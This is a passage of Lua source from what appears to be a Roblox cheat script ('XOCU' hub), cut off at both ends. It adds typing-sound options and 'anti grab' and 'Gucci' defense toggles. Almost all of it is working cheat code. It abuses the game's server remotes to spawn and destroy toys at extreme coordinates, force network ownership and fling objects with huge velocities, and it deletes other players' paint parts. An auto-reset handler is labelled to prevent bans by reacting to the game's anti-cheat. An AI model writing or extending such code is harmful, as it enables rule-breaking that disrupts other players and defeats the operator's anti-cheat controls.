        ['Thocky Typing'] = 'rbxassetid://76696739955497',
        ['Clean Typing'] = 'rbxassetid://131944804697356',
        ['Clicky Typing'] = 'rbxassetid://9116149587',
    }

    local currentSoundId = soundMap['Normal Typing']
    local typingSound = Instance.new('Sound')
    typingSound.SoundId = currentSoundId
    typingSound.Looped = true
    typingSound.Volume = 1
    typingSound.Parent = SoundService

    local typing = false
    local enabled = true
    local volume = 100

    local function startSound()
        if not enabled then return end
        if typingSound.SoundId and typingSound.SoundId ~= '' then
            if not typingSound.IsPlaying then
                typingSound:Play()
            end
        end
    end

    local function stopSound()
        typingSound:Stop()
    end

    UserInputService.TextBoxFocused:Connect(function()
        typing = true
        startSound()
    end)

    UserInputService.TextBoxFocusReleased:Connect(function()
        typing = false
        stopSound()
    end)

    SoundGroup:CreateToggle({
        Name = "Typing Sound",
        Default = true,
        Callback = function(state)
            enabled = state
            if not state then
                stopSound()
            end
        end
    })

    SoundGroup:CreateSlider({
        Name = "Volume",
        Default = 100,
        Min = 0,
        Max = 100,
        Callback = function(v)
            volume = v
            typingSound.Volume = v / 100
        end
    })

    SoundGroup:CreateDropdown({
        Name = "Typing Sound",
        Items = {
            "Normal Typing",
            "Thocky Typing",
            "Clean Typing",
            "Clicky Typing",
        },
        Default = "Normal Typing",
        Callback = function(selected)
            local id = soundMap[selected]
            if not id then return end
            currentSoundId = id
            typingSound:Stop()
            typingSound.SoundId = id
            typingSound.TimePosition = 0
        end
    })
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local PS = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local R = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = workspace
local Player = PS.LocalPlayer
local Camera = Workspace.CurrentCamera
local CE = RS:WaitForChild("CharacterEvents", 10)
local BeingHeld = Player:WaitForChild("IsHeld", 10)
local StruggleEvent = CE and CE:WaitForChild("Struggle")
function notify(title, content, duration)
	Library:Notify({ Title = title or "Notification", Content = content or "", Duration = duration or 5,
	 })
end
function sendHubLoadedMessage()
	local message = " Owner Version | XOCU loaded. "
	local sent = false
	pcall(function()
		local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
		if chatEvents then
			local say = chatEvents:FindFirstChild("SayMessageRequest")
			if say and typeof(say.FireServer) == "function" then
				say:FireServer(message, "All")
				sent = true
			end
		end
	end)
	if not sent then
		pcall(function()
			StarterGui:SetCore("ChatMakeSystemMessage", {
				Name = message;
				Color = Color3.fromRGB(255, 170, 0);
				Font = Enum.Font.SourceSansBold;
				FontSize = Enum.FontSize.Size18;
			})
		end)
	end
end
task.spawn(function()
	task.wait(1)
	sendHubLoadedMessage()
end)
local paintPartsBackup = {}
local paintConnections = {}
function deleteAllPaintParts()
	for _, obj in ipairs(Workspace:GetDescendants()) do
		if obj:IsA("BasePart") and obj.Name == "PaintPlayerPart" then
			local clone = obj:Clone()
			clone.Archivable = true
			paintPartsBackup[obj:GetDebugId()] = {
				clone = clone,
				parent = obj.Parent
			}
			obj:Destroy()
		end
	end
end
local function restorePaintParts()
	for _, data in pairs(paintPartsBackup) do
		if data.clone and data.parent then
			data.clone.Parent = data.parent
		end
	end
	paintPartsBackup = {}
end
local function watchNewPaintParts()
	table.insert(paintConnections, Workspace.DescendantAdded:Connect(function(obj)
		if obj:IsA("BasePart") and obj.Name == "PaintPlayerPart" then
			task.defer(function()
				if obj and obj.Parent then
					local clone = obj:Clone()
					clone.Archivable = true
					paintPartsBackup[obj:GetDebugId()] = {
						clone = clone,
						parent = obj.Parent
					}
					obj:Destroy()
				end
			end)
		end
	end))
end
local function disconnectWatchers()
	for _, conn in ipairs(paintConnections) do
		if conn.Connected then
			conn:Disconnect()
		end
	end
	paintConnections = {}
end
local function setTouchQuery(state)
	local char = Workspace:FindFirstChild(Player.Name)
	if not char then
		return
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:IsA("Part") or v:IsA("BasePart") then
			v.CanTouch = state
			v.CanQuery = state
		end
	end
end
local antiGucciConnection
local safePosition
local restoreFrames = 0
local function spawnBlobman()
	local args = {
		[1] = "CreatureBlobman",
		[2] = CFrame.new(0, 5000000, 0),
		[3] = Vector3.new(0, 60, 0)
	}
	pcall(function()
		ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(unpack(args))
	end)
	local folder = Workspace:WaitForChild(Player.Name .. "SpawnedInToys", 5)
	if folder and folder:FindFirstChild("CreatureBlobman") then
		local blob = folder.CreatureBlobman
		if blob:FindFirstChild("Head") then
			blob.Head.CFrame = CFrame.new(0, 50000, 0)
			blob.Head.Anchored = true
		end
		notify("Success", "Blobman Spawned!", 3)
	end
end
local function startAntiGucci()
	local character = Player.Character or Player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local rootPart = character:WaitForChild("HumanoidRootPart")
	safePosition = rootPart.Position
	local folder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
	local blob = folder and folder:FindFirstChild("CreatureBlobman")
	local seat = blob and blob:FindFirstChild("VehicleSeat")
	if not blob then
		spawnBlobman()
		task.wait(0.3)
		folder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
		blob = folder and folder:FindFirstChild("CreatureBlobman")
		seat = blob and blob:FindFirstChild("VehicleSeat")
	end
	if seat and seat:IsA("VehicleSeat") then
		rootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
		seat:Sit(humanoid)
	end
	humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
		if humanoid.Jump and humanoid.Sit then
			restoreFrames = 15
			safePosition = rootPart.Position
		end
	end)
	if antiGucciConnection then
		antiGucciConnection:Disconnect()
	end
	antiGucciConnection = R.Heartbeat:Connect(function()
		if not rootPart or not humanoid then
			return
		end
		ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(rootPart, 0)
		if restoreFrames > 0 then
			rootPart.CFrame = CFrame.new(safePosition)
			restoreFrames = restoreFrames - 1
		end
	end)
	task.spawn(function()
		while humanoid.Sit do
			task.wait(1)
		end
		task.wait(0.5)
		rootPart.CFrame = CFrame.new(safePosition)
	end)
end
local function stopAntiGucci()
	if antiGucciConnection then
		antiGucciConnection:Disconnect()
		antiGucciConnection = nil
	end
	-- Unsit humanoid first so the server releases the seat
	local char = Player.Character
	local hum = char and char:FindFirstChild("Humanoid")
	if hum then
		hum.Sit = false
		pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
	end
	local blobFolder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
	if blobFolder and blobFolder:FindFirstChild("CreatureBlobman") then
		local blob = blobFolder.CreatureBlobman
		-- Fire server-side destroy remote so it fully removes server-side
		pcall(function()
			ReplicatedStorage.MenuToys.DestroyToy:FireServer(blob)
		end)
		task.wait(0.1)
		-- Fallback local destroy in case remote didn't work
		if blob and blob.Parent then
			blob:Destroy()
		end
	end
end
local antiGucciConnectionTrain
local safePositionTrain
local restoreFramesTrain = 0
local function startAntiGucciTrain()
	local character = Player.Character or Player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local rootPart = character:WaitForChild("HumanoidRootPart")
	safePositionTrain = rootPart.Position
	local folder = workspace.Map.AlwaysHereTweenedObjects
	local train = folder and folder:FindFirstChild("Train")
	local seat
	if train then
		for _, d in ipairs(train:GetDescendants()) do
			if d:IsA("Seat") then
				seat = d
				break
			end
		end
	end
	if seat then
		rootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
		seat:Sit(humanoid)
	end
	humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
		if humanoid.Jump and humanoid.Sit then
			restoreFramesTrain = 15
			safePositionTrain = rootPart.Position
		end
	end)
	if antiGucciConnectionTrain then
		antiGucciConnectionTrain:Disconnect()
	end
	antiGucciConnectionTrain = R.Heartbeat:Connect(function()
		if not rootPart or not humanoid then
			return
		end
		ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(rootPart, 0)
		if restoreFramesTrain > 0 then
			rootPart.CFrame = CFrame.new(safePositionTrain)
			restoreFramesTrain = restoreFramesTrain - 1
		end
	end)
	task.spawn(function()
		while humanoid.Sit do
			task.wait(1)
		end
		task.wait(0.5)
		rootPart.CFrame = CFrame.new(safePositionTrain)
	end)
end
local function stopAntiGucciTrain()
	if antiGucciConnectionTrain then
		antiGucciConnectionTrain:Disconnect()
		antiGucciConnectionTrain = nil
	end
	local trainFolder = workspace.Map.AlwaysHereTweenedObjects
	if trainFolder and trainFolder:FindFirstChild("Train") then
		ResetPlayer(game.Players.LocalPlayer)
	end
end
local DefenseGroup = Tabs.Defense:CreateBlock({Name = "Defense Main", Side = "Left"})
local DefenseExtra = Tabs.Defense:CreateBlock({Name = "Extra Defense", Side = "Right"})

local antiGrabExplosionConn, antiGrabHeldConn, antiGrabStruggleConn, antiGrabHumConn, antiGrabAnchorConn
local antiGrabRootCF, antiGrabRootPos, antiGrabHardFreeze = nil, nil, false
local function antiGrabUnfreeze(char)
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if hrp then
		hrp.Anchored = false
		if hrp:FindFirstChild("FreezeJoint") then
			hrp.FreezeJoint:Destroy()
		end
	end
	antiGrabHardFreeze = false
	if antiGrabAnchorConn then
		antiGrabAnchorConn:Disconnect()
		antiGrabAnchorConn = nil
	end
end
local function antiGrabFreezeInPlace(char)
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then
		return
	end
	antiGrabRootCF = hrp.CFrame
	antiGrabRootPos = hrp.Position
	antiGrabHardFreeze = true
	if not hrp:FindFirstChild("FreezeJoint") then
		local align = Instance.new("AlignPosition")
		align.Name = "FreezeJoint"
		align.Mode = Enum.PositionAlignmentMode.OneAttachment
		align.MaxForce = 1e6
		align.MaxVelocity = 0
		align.Responsiveness = 200
		local att = Instance.new("Attachment", hrp)
		align.Attachment0 = att
		align.Position = antiGrabRootPos
		align.Parent = hrp
	end
	antiGrabAnchorConn = R.Heartbeat:Connect(function()
		if antiGrabHardFreeze and hrp then
			hrp.AssemblyLinearVelocity = Vector3.zero
			hrp.AssemblyAngularVelocity = Vector3.zero
			hrp.CFrame = antiGrabRootCF
		end
	end)
end
local function antiGrabReconnect()
	local char = Player.Character or Player.CharacterAdded:Wait()
	local hum = char:WaitForChild("Humanoid")
	local hrp = char:WaitForChild("HumanoidRootPart")
	local fp = hrp:FindFirstChild("FirePlayerPart")
	if fp then
		fp:Destroy()
	end
	if antiGrabHumConn then
		antiGrabHumConn:Disconnect()
	end
	antiGrabHumConn = hum.Changed:Connect(function(p)
		if p == "Sit" and hum.Sit then
			if not (hum.SeatPart and tostring(hum.SeatPart.Parent) == "CreatureBlobman") then
				hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
				hum.Sit = false
			end
		end
	end)
end
do
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local ContextActionService = game:GetService("ContextActionService")
    local LocalPlayer = Players.LocalPlayer

    -- Localized state management (replaces getgenv and ACGE)
    local antiGrabActive = false
    local antiGrabConnection = nil
    local spawnTick = nil

    DefenseGroup:CreateToggle({
        Name = "Seatless Gucci (Anti Grab)",
        Flag = "SeatlessGucciAntiGrab",
        Default = false,
        Callback = function(Value)
            if SetToggleState then SetToggleState("SeatlessGucciAntiGrab", Value) end
            antiGrabActive = Value

            if Value then
                if not antiGrabConnection then
                    antiGrabConnection = RunService.RenderStepped:Connect(function()
                        if not antiGrabActive then return end
                        
                        local char = LocalPlayer.Character
                        if not char then return end

                        local hum = char:FindFirstChild("Humanoid")
                        local root = char:FindFirstChild("HumanoidRootPart")
                        local myToys = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                        local ocarina = myToys and myToys:FindFirstChild("InstrumentWoodwindOcarina")
                        
                        if ocarina then
                            -- Check if we are currently being grabbed
                            for _, prt in ipairs(char:GetChildren()) do
                                local owner = prt:FindFirstChild("PartOwner")
                                if owner and owner.Value ~= "" then
                                    local holdPart = ocarina:FindFirstChild("HoldPart")
                                    local holdFunc = holdPart and holdPart:FindFirstChild("HoldItemRemoteFunction")
                                    
                                    if holdFunc then
                                        task.spawn(function()
                                            pcall(function() holdFunc:InvokeServer(ocarina, char) end)
                                        end)

                                        local menuToys = ReplicatedStorage:FindFirstChild("MenuToys")
                                        local destroyToy = menuToys and menuToys:FindFirstChild("DestroyToy")
                                        if destroyToy then
                                            pcall(function() destroyToy:FireServer(ocarina) end)
                                        end
                                        
                                        if hum then
                                            hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
                                            hum.AutoRotate = true
                                            if hum.Sit then
                                                hum.Sit = false
                                            end
                                        end

                                        pcall(function()
                                            ContextActionService:UnbindAction("Escape")
                                            ContextActionService:UnbindAction("JumpRemover")
                                        end)
                                        
                                        owner.Value = ""
                                    end
                                end
                            end
                        else
                            -- Spawn logic if Ocarina doesn't exist
                            local canSpawn = LocalPlayer:FindFirstChild("CanSpawnToy")
                            if canSpawn and canSpawn.Value and not spawnTick then
                                spawnTick = tick()
                                task.spawn(function()
                                    local menuToys = ReplicatedStorage:FindFirstChild("MenuToys")
                                    local spawnFunc = menuToys and menuToys:FindFirstChild("SpawnToyRemoteFunction")
                                    if spawnFunc then
                                        pcall(function()
                                            spawnFunc:InvokeServer(
                                                "InstrumentWoodwindOcarina",
                                                CFrame.new(1e5, 1e5, 1e5),
                                                Vector3.zero
                                            )
                                        end)
                                    end
                                end)
                            elseif spawnTick and tick() - spawnTick > 1 and not (myToys and myToys:FindFirstChild("InstrumentWoodwindOcarina")) then
                                spawnTick = nil
                            end

                            -- Grab escape fallback
                            local grabbed = false
                            for _, prt in ipairs(char:GetChildren()) do
                                local owner = prt:FindFirstChild("PartOwner")
                                if owner and owner.Value ~= "" then
                                    grabbed = true
                                    break
                                end
                            end

                            if grabbed then
                                local charEvents = ReplicatedStorage:FindFirstChild("CharacterEvents")
                                if charEvents then
                                    local struggle = charEvents:FindFirstChild("Struggle")
                                    local ragdollRemote = charEvents:FindFirstChild("RagdollRemote")
                                    
                                    if struggle then pcall(function() struggle:FireServer(LocalPlayer) end) end
                                    if ragdollRemote and root then pcall(function() ragdollRemote:FireServer(root, 0) end) end
                                end
                                
                                if hum and type(stopOcarinaAnim) == "function" then
                                    pcall(stopOcarinaAnim, hum)
                                end
                            end
                        end

                        if hum and type(stopOcarinaAnim) == "function" then
                            pcall(stopOcarinaAnim, hum)
                        end
                    end)
                end
            else
                if antiGrabConnection then
                    antiGrabConnection:Disconnect()
                    antiGrabConnection = nil
                end
            end
        end
    })
end
local autoStruggleConn = nil
local AntiGrabEnabled = false
local HeldConnection = nil

do
    local RunService = game:GetService("RunService")
    local AntiGrab = false
    local AntiGrabProc = false
    local AGWalk = false
    local Cons = {}
    
    local function DiscAll()
        for k, v in pairs(Cons) do
            if v then v:Disconnect() end
        end
        table.clear(Cons)
    end

    local function ApplyAntiGrab(char)
        if not char or not AntiGrab then return end
        
        local hrp = char:WaitForChild("HumanoidRootPart", 5)
        local hum = char:WaitForChild("Humanoid", 5)
        local head = char:WaitForChild("Head", 5)
        local torso = char:WaitForChild("Torso", 5) or char:WaitForChild("UpperTorso", 5)
        if not (hrp and hum and head and torso) then return end

        local beingHeld = char:FindFirstChild("BeingHeld")
        local wasRagdolled = false

        Cons["AGCFrameLimbing"] = RunService.Heartbeat:Connect(function()
            local ragdolled = hum:FindFirstChild("Ragdolled")
            
            if ragdolled and ragdolled.Value then
                wasRagdolled = true
                local leftArm = char:FindFirstChild("Left Arm")
                local rightArm = char:FindFirstChild("Right Arm")
                local leftLeg = char:FindFirstChild("Left Leg")
                local rightLeg = char:FindFirstChild("Right Leg")

                if leftArm then leftArm.CFrame = torso.CFrame * CFrame.new(-1.5, 0, 0); leftArm.CanCollide = false end
                if rightArm then rightArm.CFrame = torso.CFrame * CFrame.new(1.5, 0, 0); rightArm.CanCollide = false end
                if leftLeg then leftLeg.CFrame = torso.CFrame * CFrame.new(-0.5, -2, 0); leftLeg.CanCollide = false end
                if rightLeg then rightLeg.CFrame = torso.CFrame * CFrame.new(0.5, -2, 0); rightLeg.CanCollide = false end
            elseif wasRagdolled then
                wasRagdolled = false
                local limbs = {"Left Arm", "Right Arm", "Left Leg", "Right Leg"}
                for _, limbName in ipairs(limbs) do
                    local limb = char:FindFirstChild(limbName)
                    if limb then limb.CanCollide = true end
                end
            end
        end)

        Cons["AGHead"] = head.ChildAdded:Connect(function(PartOwner)
            if PartOwner.Name == "PartOwner" then
                if not AntiGrabProc then
                    AntiGrabProc = true
                    hum.Sit = false
                    
                    pcall(function() StruggleEvent:FireServer(Player) end)
                    
                    task.spawn(function() 
                        while (head and head:FindFirstChild("PartOwner")) or (beingHeld and beingHeld.Value) do
                            pcall(function() StruggleEvent:FireServer(Player) end)
                            pcall(function() ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0) end)
                            task.wait()
                        end
                    end)
                    
                    task.spawn(function()
                        hrp.Anchored = true
                        if not AGWalk then
                            AGWalk = true
                            pcall(function()
                                while (head and head:FindFirstChild("PartOwner")) or (beingHeld and beingHeld.Value) do
                                    hrp.CFrame = hrp.CFrame + hum.MoveDirection * 0.43
                                    task.wait()
                                end
                            end)
                        end
                        hrp.Anchored = false
                        AntiGrabProc = false
                        AGWalk = false
                    end)
                end
            end
        end)
        
        local weldHRP = hrp:WaitForChild("WeldHRP", 5)
        if weldHRP then
            Cons["AGWeld"] = weldHRP.Changed:Connect(function()
                if hrp.WeldHRP.Enabled then
                    task.spawn(function()
                        while hrp.WeldHRP.Enabled and task.wait() do
                            hum.Sit = false
                            hum.AutoRotate = true
                            hum.HipHeight = 0
                            pcall(function() head.CFrame = hrp.CFrame + Vector3.new(0, 1.35, 0) end)
                        end
                        hum.HipHeight = 0
                    end)
                end
            end)
        end
    end

    DefenseGroup:CreateToggle({
        Name = "Anti Grab BEST ",
        Flag = "AntiGrab",
        Default = false,
        Callback = function(Value)
            AntiGrab = Value
            DiscAll()
            
            if AntiGrab then
                ApplyAntiGrab(Player.Character)
                Cons["AGChar"] = Player.CharacterAdded:Connect(ApplyAntiGrab)
            else
                local char = Player.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then hrp.Anchored = false end
                    
                    local limbs = {"Left Arm", "Right Arm", "Left Leg", "Right Leg"}
                    for _, limbName in ipairs(limbs) do
                        local limb = char:FindFirstChild(limbName)
                        if limb then limb.CanCollide = true end
                    end
                end
            end
        end
    })
end

RunService = game:GetService('RunService')
Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
SpawnToyRemoteFunction = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
GrabEvents = ReplicatedStorage.GrabEvents
SetNetworkOwner = GrabEvents.SetNetworkOwner
CharacterEvents = ReplicatedStorage.CharacterEvents
RagdollRemote = CharacterEvents.RagdollRemote
GUE = false
GUTYPE = 'CreatureBlobman'
inexistance = {}

local itm
local sp
local sv
local humconnection
local LocalPlayer = game.Players.LocalPlayer

local gucciTypes = {
    ['Blobman'] = 'CreatureBlobman',
    ['Tractor'] = 'TractorGreen',
    ['Santa Sleigh'] = 'SantaSleigh'
}

local selectedGucciType = 'CreatureBlobman'

function getCharParts()
    local char = LocalPlayer.Character
    if not char then
        return nil, nil
    end
    return char:FindFirstChild('Humanoid'), char:FindFirstChild('HumanoidRootPart')
end

hum, hrp = getCharParts()

local characterAddedConnection
gucciRunning = false

function diddle()
    if itm then
        for _, prt in pairs(itm:GetChildren())do
            if prt:IsA('BasePart') then
                prt.CanCollide = false
            end
        end
    end
    hrp.CFrame = sp
    hrp.AssemblyLinearVelocity = sv
    hum:GetPropertyChangedSignal('SeatPart'):Once(diddle)
end

function checkgrab(part)
    pcall(function()
        SetNetworkOwner:FireServer(part, part.CFrame)
    end)
end

function gucciblob()
    if gucciRunning then
        return
    end
    gucciRunning = true

    local guccion = false
    local tickyticky = tick()

    while GUE do
        hum, hrp = getCharParts()

        if hum and hrp then
            local dt = tick() - tickyticky
            tickyticky = tick()

            if itm and itm:FindFirstChild('VehicleSeat') then
                local occupant = itm.VehicleSeat.Occupant
                if occupant and occupant ~= hum then
                    task.spawn(function()
                        DestroyToy:FireServer(itm)
                    end)
                    itm = nil
                    guccion = false
                    inexistance = {}
                    task.wait(0.1)
                    if LocalPlayer.CanSpawnToy.Value then
                        task.spawn(function()
                            SpawnToyRemoteFunction:InvokeServer(selectedGucciType, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
                        end)
                    end
                    task.wait()
                    continue
                end
            end

            if itm and itm.Parent and not ((itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant ~= hum) or inexistance[itm] < 1) then
                task.spawn(function()
                    DestroyToy:FireServer(itm)
                end)
            else
                local toyFolder = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')
                itm = toyFolder and toyFolder:FindFirstChild(selectedGucciType)
            end

            if not sp or not hum.SeatPart then
                sp = hrp.CFrame
                sv = hrp.AssemblyLinearVelocity
            end

            if humconnection ~= hum then
                humconnection = hum
                hum:GetPropertyChangedSignal('SeatPart'):Once(diddle)
            end

            local wait = true

            if itm then
                inexistance[itm] = (inexistance[itm] or 0) + dt

                if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                    if not guccion then
                        (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    end

                    local diddy = itm.VehicleSeat
                    diddy.Parent = nil
                    diddy.Parent = itm

                    if not checkgrab(itm) and (hrp.CFrame.Position - (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).CFrame.Position).Magnitude < 28 then
                        for _, prt in pairs(itm:GetChildren())do
                            if prt:IsA('BasePart') and prt.CanQuery then
                                SetNetworkOwner:FireServer(prt, CFrame.lookAt(hrp.CFrame.Position, prt.CFrame.Position))
                            end
                        end
                    end

                    if not hum.SeatPart then
                        hum.Sit = false
                    else
                        wait = false
                        task.wait()
                    end

                    if hrp and hum and (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                        local ragdolled = hum:FindFirstChild('Ragdolled')
                        if ragdolled and ragdolled.Value then
                            guccion = false
                        end

                        if itm.VehicleSeat.Occupant == hum then
                            guccion = true
                        elseif not guccion then
                            task.wait()
                            wait = false
                            if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                                local ragdolled2 = hum:FindFirstChild('Ragdolled')
                                if not ragdolled2 or not ragdolled2.Value then
                                    itm.VehicleSeat:Sit(hum)
                                    RagdollRemote:FireServer(hrp, 0.016)
                                end
                            end
                        end

                        if guccion then
                            (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = Vector3.new(0, 1e15, 0)
                        else
                            if inexistance[itm] >= game.Stats.Network.ServerStatsItem['Data Ping']:GetValue() / 250 then
                                task.spawn(function()
                                    DestroyToy:FireServer(itm)
                                end)
                                hum.Sit = true
                            end
                        end
                    end
                else
                    if guccion then
                        hum.Sit = true
                    end
                    guccion = false
                    if inexistance[itm] >= 1 then
                        task.spawn(function()
                            DestroyToy:FireServer(itm)
                        end)
                        if LocalPlayer.CanSpawnToy.Value then
                            task.spawn(function()
                                SpawnToyRemoteFunction:InvokeServer(selectedGucciType, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
                            end)
                        end
                    end
                end
            else
                if guccion then
                    guccion = false
                    hum.Sit = true
                end
                if LocalPlayer.CanSpawnToy.Value then
                    task.spawn(function()
                        SpawnToyRemoteFunction:InvokeServer(selectedGucciType, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
                    end)
                end
            end

            if wait then
                task.wait()
                hum.Sit = false
            end
        else
            task.wait()
        end
    end
    gucciRunning = false
end

function onCharacterAdded(char)
    if not GUE then
        return
    end
    if itm and itm.Parent then
        task.spawn(function()
            DestroyToy:FireServer(itm)
        end)
    end
    itm = nil
    inexistance = {}
    humconnection = nil
    sp = nil
    sv = nil
    gucciRunning = false

    char:WaitForChild('Humanoid', 10)
    char:WaitForChild('HumanoidRootPart', 10)

    hum, hrp = getCharParts()
    task.wait(0.5)
    task.spawn(gucciblob)
end

if characterAddedConnection then
    characterAddedConnection:Disconnect()
end

characterAddedConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

DefenseGroup:CreateDropdown({
    Name = "Gucci Type",
    Items = {"Blobman", "Tractor", "Santa Sleigh"},
    Default = "Blobman",
    Callback = function(Value)
        selectedGucciType = gucciTypes[Value] or 'CreatureBlobman'
    end
})

DefenseGroup:CreateToggle({
    Name = "[GUCCI] Anti Grab",
    Tooltip = 'Makes you unable to be touched by anyone or anything.',
    Default = false,
    Callback = function(Value)
        GUE = Value
        if Value then
            task.spawn(gucciblob)
        else
            if itm and itm.Parent then
                task.spawn(function()
                    DestroyToy:FireServer(itm)
                end)
            end
            itm = nil
        end
    end
})

local autoGucciActiveTrain =  false
DefenseGroup:CreateToggle({
	Name = "Anti Gucci (Train)",
        Flag = "Anti Gucci (Train)",
	Default = false,
	Callback = function(Value)
        SetToggleState("Anti Gucci (Train)", Value)
		autoGucciActiveTrain = Value
		if Value then
			startAntiGucciTrain()
			notify("system", "Gucci active (monitoring)", 3)
			task.spawn(function()
				while autoGucciActiveTrain do
					local trainFolder = workspace.Map.AlwaysHereTweenedObjects
					local trainExists = trainFolder and trainFolder:FindFirstChild("Train")
					if not trainExists then
						stopAntiGucciTrain()
						notify("System", "Train lost", 3)
						local retries = 0
						repeat
							task.wait(0.2)
							retries = retries + 1
							trainFolder = workspace.Map.AlwaysHereTweenedObjects
						until (trainFolder and trainFolder:FindFirstChild("Train")) or retries > 25 or not autoGucciActiveTrain
						if autoGucciActiveTrain and trainFolder and trainFolder:FindFirstChild("Train") then
							startAntiGucciTrain()
							notify("System", "Train restored.", 3)
						end
					end
					task.wait(0.5)
				end
			end)
		else
			autoGucciActiveTrain = false
			stopAntiGucciTrain()
			notify("System", "Gucci disabled.", 3)
		end
	end
})

-- Anti Ragdoll (On Blob)
do
    local AntiRagBlob = false
    local RagdolledSit = false
    local Cons = {}

    local function ApplyAntiRagdoll(char)
        if not char or not AntiRagBlob then return end
        
        local hum = char:WaitForChild("Humanoid", 5)
        local HRP = char:WaitForChild("HumanoidRootPart", 5)
        if not (hum and HRP) then return end
        
        if Cons["ARSeat"] then Cons["ARSeat"]:Disconnect() end
        Cons["ARSeat"] = hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
            if hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman" and not RagdolledSit then
                RagdolledSit = true
                local Seat = hum.SeatPart
                while not hum.Sit do task.wait() end
                
                ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(HRP, 3)
                
                local ragdolledVal = hum:FindFirstChild("Ragdolled")
                while ragdolledVal and not ragdolledVal.Value and not hum.Sit do task.wait() end
                
                task.wait(0.4)
                hum.Sit = false
                Seat:Sit(hum)
                
                task.delay(0.25, function()
                    while hum and hum.SeatPart do
                        ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(HRP, 1)
                        task.wait(0.05)
                    end
                    RagdolledSit = false
                end)
            end
        end)
    end

    DefenseGroup:CreateToggle({
        Name = "Anti Ragdoll (On Blob)",
        Flag = "AntiRagdoll",
        Default = false,
        Callback = function(Value)
            AntiRagBlob = Value
            RagdolledSit = false
            
            if Cons["ARChar"] then Cons["ARChar"]:Disconnect() end
            if Cons["ARSeat"] then Cons["ARSeat"]:Disconnect() end
            
            if AntiRagBlob then
                ApplyAntiRagdoll(Player.Character)
                Cons["ARChar"] = Player.CharacterAdded:Connect(ApplyAntiRagdoll)
            end
        end
    })
end


DefenseGroup:CreateToggle({
    Name = "anti snowball",
    Flag = "LoopRagdoll",
    Default = false,
    Callback = function(Value)
        SetToggleState("LoopRagdoll", Value)
        loopRagdoll = Value
        
        if Value then
            task.spawn(function()
                while loopRagdoll and task.wait(0.05) do
                    pcall(function()
                        local char = Player.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0.5)
                        end
                    end)
                end
            end)
        end
    end
})
antiblob = false
antiblobConnection = nil
truePosPart = nil

DefenseGroup:CreateToggle({
    Name = "Auto Reset",
        Flag = "Auto Reset",
    Default = false,
    Callback = function(v)
        SetToggleState("Auto Reset", Value)
        -- Clear old connection
        if _G.AutoResetCon then _G.AutoResetCon:Disconnect() end

        if v then
            _G.AutoResetCon = game:GetService("ReplicatedStorage").GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(r)
                if r == "Flying" then
                    local char = game:GetService("Players").LocalPlayer.Character
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    
                    if hum then
                        Library:Notify("Auto Reset[Prevent Ban!]", 4)
                        -- Break Joint/Health is more reliable for "Defense" than ChangeState
